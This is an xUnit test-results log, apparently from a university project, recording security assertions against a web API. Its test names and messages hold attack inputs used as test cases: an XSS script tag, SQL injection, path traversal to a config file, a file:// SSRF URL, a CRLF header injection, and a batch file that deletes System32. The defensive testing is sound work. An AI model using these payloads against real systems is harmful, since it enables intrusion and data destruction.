      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be one of {HttpStatusCode.Unauthorized {value: 401}, HttpStatusCode.NotFound {value: 404}, HttpStatusCode.Forbidden {value: 403}} because A16 — El endpoint /diagnostics/info NO debe ser accesible sin autenticación, but found HttpStatusCode.OK {value: 200}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.BeOneOf(IEnumerable`1 validValues, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo5_Servidor.G5_DebugInfo_Asserts.A16_DebugInfo_WithoutAuth_ShouldReturn401Or404() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo5_Servidor\G5_DebugInfo_Asserts.cs:line 30&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="c257ae4d-4d58-4c1c-b849-ca1aa492de9f" testId="1ccf0b28-71a9-60e0-50a9-8f9e152291ab" testName="SecurityAsserts.Grupo4_Infraestructura.G4_TLS_Asserts.C01_HSTS_StrictTransportSecurity_ShouldBePresent" computerName="YOURCOMPUTER" duration="00:00:00.0197330" startTime="2026-05-15T01:33:08.2495966-05:00" endTime="2026-05-15T01:33:08.2495967-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="c257ae4d-4d58-4c1c-b849-ca1aa492de9f" />
    <UnitTestResult executionId="480a5c34-e666-4916-a328-48da22c85727" testId="0508a6fe-08c7-a721-05c9-6d733f5e9f62" testName="SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(returnUrl: &quot;https://evil.example.com/phishing&quot;, description: &quot;dominio externo&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0169348" startTime="2026-05-15T01:33:08.2472867-05:00" endTime="2026-05-15T01:33:08.2472868-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="480a5c34-e666-4916-a328-48da22c85727">
      <Output>
        <ErrorInfo>
          <Message>Expected collection {HttpStatusCode.MovedPermanently {value: 301}, HttpStatusCode.Found {value: 302}, HttpStatusCode.RedirectKeepVerb {value: 307}, HttpStatusCode.PermanentRedirect {value: 308}} to not contain HttpStatusCode.Found {value: 302} because A23 — Open Redirect: returnUrl externo 'dominio externo' no debe emitir redirect 3xx.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Collections.GenericCollectionAssertions`3.NotContain(T unexpected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(String returnUrl, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo7_Reportes\G7_OpenRedirect_Asserts.cs:line 51&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="9a2aac45-d9e8-4655-a89a-f92b05cf3298" testId="3f5bc35d-4985-597c-32de-7c833c348be7" testName="SecurityAsserts.Grupo3_Inyeccion.G3_XSS_Asserts.A09_XSS_CategoryPayload_ShouldNotReflectScriptInBody" computerName="YOURCOMPUTER" duration="00:00:00.0542538" startTime="2026-05-15T01:33:08.2440284-05:00" endTime="2026-05-15T01:33:08.2440285-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="9a2aac45-d9e8-4655-a89a-f92b05cf3298">
      <Output>
        <ErrorInfo>
          <Message>Did not expect body "{"query":"&lt;script&gt;alert('XSS')&lt;/script&gt;","results":[]}" to contain "&lt;script&gt;" because A09 — XSS reflejado: el payload &lt;script&gt; NO debe aparecer sin codificar en la respuesta.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.StringAssertions`1.NotContain(String unexpected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo3_Inyeccion.G3_XSS_Asserts.A09_XSS_CategoryPayload_ShouldNotReflectScriptInBody() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo3_Inyeccion\G3_XSS_Asserts.cs:line 37&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="fc8972c7-283f-4930-925c-b685c862dc8c" testId="bbacebef-eea7-2397-55c3-1b0b2c927dcb" testName="SecurityAsserts.Grupo3_Inyeccion.G3_HeaderInjection_Asserts.A24_HeaderInjection_CrlfInQuery_ShouldNotInjectHeaders(query: &quot;test%0d%0aSet-Cookie:%20session=evil&quot;, description: &quot;CRLF URL-encoded&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0050919" startTime="2026-05-15T01:33:08.1970370-05:00" endTime="2026-05-15T01:33:08.1970373-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="fc8972c7-283f-4930-925c-b685c862dc8c" />
    <UnitTestResult executionId="73c2149f-6d59-4228-b1cc-490ff8e316a5" testId="8fc56e7d-9791-1cbd-6e83-787f8a4cf760" testName="SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(payload: &quot;..%2F..%2Fappsettings.json&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0209119" startTime="2026-05-15T01:33:08.2527700-05:00" endTime="2026-05-15T01:33:08.2527701-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="73c2149f-6d59-4228-b1cc-490ff8e316a5">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(String payload) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo3_Inyeccion\G3_PathTraversal_Asserts.cs:line 57&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="fcaa7476-fe52-402b-ba5d-2756511853bb" testId="b31e0bdf-ab11-57c8-9233-fbb98aa6e72b" testName="SecurityAsserts.Grupo1_ControlAcceso.G1_SensitiveData_Asserts.A18b_SensitiveData_GetMe_ShouldNotExposePasswordOrInternalFields" computerName="YOURCOMPUTER" duration="00:00:00.0216020" startTime="2026-05-15T01:33:08.2552960-05:00" endTime="2026-05-15T01:33:08.2552961-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="fcaa7476-fe52-402b-ba5d-2756511853bb">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo1_ControlAcceso.G1_SensitiveData_Asserts.A18b_SensitiveData_GetMe_ShouldNotExposePasswordOrInternalFields() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo1_ControlAcceso\G1_SensitiveData_Asserts.cs:line 50&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="acb19e64-250e-49f5-b635-c01afd1164a4" testId="30b07743-9a3e-c206-1cd4-4471395af779" testName="SecurityAsserts.Grupo3_Inyeccion.G3_SQLi_Asserts.A08_SQLi_SearchWithOrPayload_ShouldNotReturnAllRecords" computerName="YOURCOMPUTER" duration="00:00:00.1239061" startTime="2026-05-15T01:33:08.2359171-05:00" endTime="2026-05-15T01:33:08.2359172-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="acb19e64-250e-49f5-b635-c01afd1164a4">
      <Output>
        <ErrorInfo>
          <Message>Expected sqliCount to be less than or equal to 1 because A08 — SQLi: el payload OR '1'='1' NO debe retornar todos los registros de la BD, but found 3.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Numeric.NumericAssertions`2.BeLessThanOrEqualTo(T expected, String because, Object[] becauseArgs)&#xD;
   at FluentAssertions.Numeric.NumericAssertions`2.BeLessOrEqualTo(T expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo3_Inyeccion.G3_SQLi_Asserts.A08_SQLi_SearchWithOrPayload_ShouldNotReturnAllRecords() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo3_Inyeccion\G3_SQLi_Asserts.cs:line 48&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="c241d03d-2280-442b-aa5a-36c330c7f2c1" testId="db490dad-9487-af6e-a84c-96598d7eeba7" testName="SecurityAsserts.Grupo6_Archivos.G6_ReDoS_Asserts.A25_ReDoS_CatastrophicPattern_ShouldRespondWithin2Seconds(pattern: &quot;(a|aa)+&quot;, input: &quot;aaaaaaaaaaaaaaaaaab&quot;, description: &quot;alternación con overlap&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0159148" startTime="2026-05-15T01:33:08.1905312-05:00" endTime="2026-05-15T01:33:08.1905313-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="c241d03d-2280-442b-aa5a-36c330c7f2c1" />
    <UnitTestResult executionId="aee2a21e-bd53-4e21-9f74-7797491bb143" testId="b07d8c9f-596d-6529-253e-00534ed2ff39" testName="SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(url: &quot;file:///C:/Windows/win.ini&quot;, description: &quot;file scheme&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0041062" startTime="2026-05-15T01:33:15.2350263-05:00" endTime="2026-05-15T01:33:15.2350265-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="aee2a21e-bd53-4e21-9f74-7797491bb143">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be one of {HttpStatusCode.BadRequest {value: 400}, HttpStatusCode.Forbidden {value: 403}} because A15 — SSRF: URL a file scheme ('file:///C:/Windows/win.ini') debe rechazarse con 400/403, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.BeOneOf(IEnumerable`1 validValues, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Grupo5_Servidor.G5_SSRF_Asserts.A15_SSRF_PrivateRangeUrl_ShouldReturn400Or403(String url, String description) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo5_Servidor\G5_SSRF_Asserts.cs:line 45&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="b903b781-aa87-4c0a-9fa6-a5593a75eeb8" testId="893555df-1937-dfb5-5f50-b90984c33bd2" testName="SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13c_PathTraversal_ConfigFile_ShouldNotExposeContent" computerName="YOURCOMPUTER" duration="00:00:00.0070350" startTime="2026-05-15T01:33:08.2628740-05:00" endTime="2026-05-15T01:33:08.2628742-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="b903b781-aa87-4c0a-9fa6-a5593a75eeb8">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13c_PathTraversal_ConfigFile_ShouldNotExposeContent() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo3_Inyeccion\G3_PathTraversal_Asserts.cs:line 74&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="83bb8822-e56e-4f2c-8d7e-7d65f5ce118e" testId="6ada3de3-9484-f402-c0f8-2201ba3b37f5" testName="SecurityAsserts.Grupo7_Reportes.G7_XXE_Asserts.A22c_XXE_SsrfViaXml_ShouldNotLeakCloudMetadata" computerName="YOURCOMPUTER" duration="00:00:00.0106891" startTime="2026-05-15T01:33:08.2588616-05:00" endTime="2026-05-15T01:33:08.2588616-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="83bb8822-e56e-4f2c-8d7e-7d65f5ce118e">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo7_Reportes.G7_XXE_Asserts.A22c_XXE_SsrfViaXml_ShouldNotLeakCloudMetadata() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo7_Reportes\G7_XXE_Asserts.cs:line 97&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="50b4252f-5199-415d-a4c1-bd9c9e77d7e8" testId="764d1ed1-1aad-4e4d-233e-07cf76871a1f" testName="SecurityAsserts.Grupo5_Servidor.G5_SensitiveLogs_Asserts.A28b_SensitiveLog_LoginResponseShouldNotReturnPassword" computerName="YOURCOMPUTER" duration="00:00:00.0650768" startTime="2026-05-15T01:33:08.1732145-05:00" endTime="2026-05-15T01:33:08.1732145-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Passed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="50b4252f-5199-415d-a4c1-bd9c9e77d7e8" />
    <UnitTestResult executionId="9499a698-7b9a-4bbf-baaa-44a051f9ddd1" testId="3760f08c-e440-e8d3-e808-c054176104c8" testName="SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14_FileUpload_ExecutableExtension_ShouldReturn400Or415(fileName: &quot;cmd.bat&quot;, content: &quot;@echo off &amp; del /f /q C:\\Windows\\System32&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0125925" startTime="2026-05-15T01:33:08.2602612-05:00" endTime="2026-05-15T01:33:08.2602613-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="9499a698-7b9a-4bbf-baaa-44a051f9ddd1">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14_FileUpload_ExecutableExtension_ShouldReturn400Or415(String fileName, String content) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo6_Archivos\G6_FileUpload_Asserts.cs:line 41&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="280d0333-1ca1-4bb6-9f6c-f1d62348c3b2" testId="24cc5382-ef20-4134-14bb-aeb8bbfd0d26" testName="SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14b_FileUpload_OversizedFile_ShouldReturn413" computerName="YOURCOMPUTER" duration="00:00:00.1243285" startTime="2026-05-15T01:33:08.2450256-05:00" endTime="2026-05-15T01:33:08.2450256-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="280d0333-1ca1-4bb6-9f6c-f1d62348c3b2">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
   at SecurityAsserts.Grupo6_Archivos.G6_FileUpload_Asserts.A14b_FileUpload_OversizedFile_ShouldReturn413() in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Grupo6_Archivos\G6_FileUpload_Asserts.cs:line 60&#xD;
--- End of stack trace from previous location ---</StackTrace>
        </ErrorInfo>
      </Output>
    </UnitTestResult>
    <UnitTestResult executionId="31ea4b54-5a05-4c59-805e-3b5063ca664f" testId="3aa5bbba-84ca-8574-1054-96677cfede67" testName="SecurityAsserts.Grupo3_Inyeccion.G3_PathTraversal_Asserts.A13b_PathTraversal_EncodedPayloads_ShouldNotReturn200(payload: &quot;%2e%2e/%2e%2e/appsettings.json&quot;)" computerName="YOURCOMPUTER" duration="00:00:00.0111133" startTime="2026-05-15T01:33:08.2598879-05:00" endTime="2026-05-15T01:33:08.2598880-05:00" testType="13cdc9d9-ddb5-4fa4-a97d-d965ccfc6d4b" outcome="Failed" testListId="8c84fa94-04c1-424b-9868-57a2d4851a1d" relativeResultsDirectory="31ea4b54-5a05-4c59-805e-3b5063ca664f">
      <Output>
        <ErrorInfo>
          <Message>Expected response.StatusCode to be HttpStatusCode.OK {value: 200} because Login de usera@test.local debe retornar 200, but found HttpStatusCode.InternalServerError {value: 500}.</Message>
          <StackTrace>   at FluentAssertions.Execution.XUnit2TestFramework.Throw(String message)&#xD;
   at FluentAssertions.Execution.TestFrameworkProvider.Throw(String message)&#xD;
   at FluentAssertions.Execution.DefaultAssertionStrategy.HandleFailure(String message)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(Func`1 failReasonFunc)&#xD;
   at FluentAssertions.Execution.AssertionScope.FailWith(String message, Object[] args)&#xD;
   at FluentAssertions.Primitives.EnumAssertions`2.Be(TEnum expected, String because, Object[] becauseArgs)&#xD;
   at SecurityAsserts.Helpers.AuthHelper.GetTokenAsync(HttpClient client, String email, String password) in C:\Trabajo\Universidad\Inyector\SecurityAsserts\Helpers\AuthHelper.cs:line 19&#xD;
[...]
[xUnit.net 00:00:11.35]         --- End of stack trace from previous location ---&#xD;
[xUnit.net 00:00:11.35]   Finished:    SecurityAsserts&#xD;
</StdOut>
    </Output>
    <RunInfos>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2307428-05:00">
        <Text>[xUnit.net 00:00:00.25]     SecurityAsserts.Grupo4_Infraestructura.G4_API_Asserts.C04_ApiVersion_V1Route_ShouldReturnDeprecationHeader [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2320984-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo6_Archivos.G6_JWTQueryString_Asserts.A17b_JWT_TokenInQueryString_AuthHeaderStillWorks [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2325210-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo2_Configuracion.G2_CORS_Asserts.B06_CORS_AllowOriginWildcard_ShouldNotBePresent [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2328660-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo1_ControlAcceso.G1_BOLA_Asserts.A01_BOLA_GetUser_UserAAccessingUserBProfile_ShouldReturn403Or404 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2332188-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo2_Configuracion.G2_InputLimits_Asserts.B10_InputSize_OversizedJsonPayload_ShouldReturn413Or400 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2351501-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo7_Reportes.G7_OpenRedirect_Asserts.A23_OpenRedirect_ExternalUrl_ShouldReturn400(returnUrl: "%2f%2fevil.example.com/", description: "encoded external") [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2352958-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo1_ControlAcceso.G1_IDOR_Asserts.A20_IDOR_EnumerateUsers_ShouldReturn403NotMixOf200And404 [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2354166-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo1_ControlAcceso.G1_SensitiveData_Asserts.A18_SensitiveData_GetUser_ShouldNotExposePassword [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2355015-05:00">
        <Text>[xUnit.net 00:00:00.26]     SecurityAsserts.Grupo2_Configuracion.G2_Headers_Asserts.B04_Headers_ServerHeader_ShouldNotExposeVersion [FAIL]</Text>
      </RunInfo>
      <RunInfo computerName="YOURCOMPUTER" outcome="Error" timestamp="2026-05-15T01:33:08.2355894-05:00">
